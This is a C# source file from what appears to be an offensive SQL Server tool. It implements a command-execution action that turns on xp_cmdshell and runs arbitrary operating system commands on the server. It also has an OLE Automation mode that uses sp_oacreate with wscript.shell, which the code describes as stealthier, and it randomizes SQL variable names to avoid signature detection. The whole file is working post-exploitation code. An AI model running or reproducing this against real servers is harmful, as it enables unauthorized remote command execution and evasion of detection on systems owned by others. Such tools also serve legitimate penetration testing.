// MSSQLand/Actions/Execution/XpCmd.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;

namespace MSSQLand.Actions.Execution
{
    internal class XpCmd : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, Description = "Operating system command to execute")]
        private string _command = "";

        [ArgumentMetadata(LongName = "ole", Description = "Use OLE Automation (stealthier, no output)")]
        private bool _useOle = false;

        /// <summary>
        /// Validates the arguments passed to the Shell action.
        /// </summary>
        /// <param name="args">The command to execute.</param>
        public override void ValidateArguments(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                throw new ArgumentException("Shell action requires a CMD command.");
            }

            BindArguments(args);

            if (string.IsNullOrWhiteSpace(_command))
            {
                throw new ArgumentException("A command must be provided.");
            }
        }

        /// <summary>
        /// Executes the provided shell command on the SQL server.
        /// </summary>
        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
        /// <returns>A list of strings containing the command output, or an empty list if no output.</returns>
        public override object Execute(DatabaseContext databaseContext)
        {
            if (_useOle)
            {
                return ExecuteOle(databaseContext);
            }

            Logger.TaskNested($"Executing command: {_command}");

            // Ensure 'xp_cmdshell' is enabled
            if (!databaseContext.ConfigService.SetConfigurationOption("xp_cmdshell", 1))
            {
                Logger.Error("Failed to enable 'xp_cmdshell'.");
                return null;
            }

            string query = $"EXEC master..xp_cmdshell '{_command.Replace("'", "''")}'";

            List<string> outputLines = new();

            try
            {
                using SqlDataReader result = databaseContext.QueryService.Execute(query);

                if (result.HasRows)
                {
                    Logger.NewLine();
                    while (result.Read())
                    {
                        string output = result.IsDBNull(0) ? string.Empty : result.GetString(0);
                        Console.WriteLine(output);
                        outputLines.Add(output);
                    }

                    return outputLines;
                }

                Logger.Warning("The command executed but returned no results.");
                return outputLines;
            }
            catch (SqlException ex)
            {
                // Handle specific xp_cmdshell proxy account error
                if (ex.Message.Contains("xp_cmdshell_proxy_account") || ex.Message.Contains("proxy account"))
                {
                    Logger.Error("xp_cmdshell proxy account is not configured or invalid.");
                    Logger.ErrorNested("1. SQL Server service account lacks permissions to execute the command");
                    Logger.ErrorNested("2. No xp_cmdshell proxy credential is configured");
                }
                else
                {
                    Logger.Error($"SQL Error executing xp_cmdshell: {ex.Message}");
                }
                return null;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error executing xp_cmdshell: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Executes the provided command using OLE Automation (stealthier, fire-and-forget, no output).
        /// </summary>
        /// <param name="databaseContext">The DatabaseContext instance to execute the query.</param>
        /// <returns>0 on success, null on failure.</returns>
        private object ExecuteOle(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Executing OLE command: {_command}");

            // Ensure 'Ole Automation Procedures' are enabled
            if (!databaseContext.ConfigService.SetConfigurationOption("Ole Automation Procedures", 1))
            {
                Logger.Error("Unable to enable Ole Automation Procedures. Ensure you have the necessary permissions.");
                return null;
            }

            // Randomized variable names to avoid signature detection
            string objVar = Misc.GetRandomIdentifier(6);

            // Escape single quotes in command
            string escapedCommand = _command.Replace("'", "''");

            string query = $@"
DECLARE @{objVar} INT;
EXEC sp_oacreate 'wscript.shell', @{objVar} out;
EXEC sp_oamethod @{objVar}, 'Run', NULL, '{escapedCommand}', 0, 0;
EXEC sp_oadestroy @{objVar};";

            databaseContext.QueryService.ExecuteNonProcessing(query);
            Logger.Success("Executed command");
            return 0;
        }
    }
}
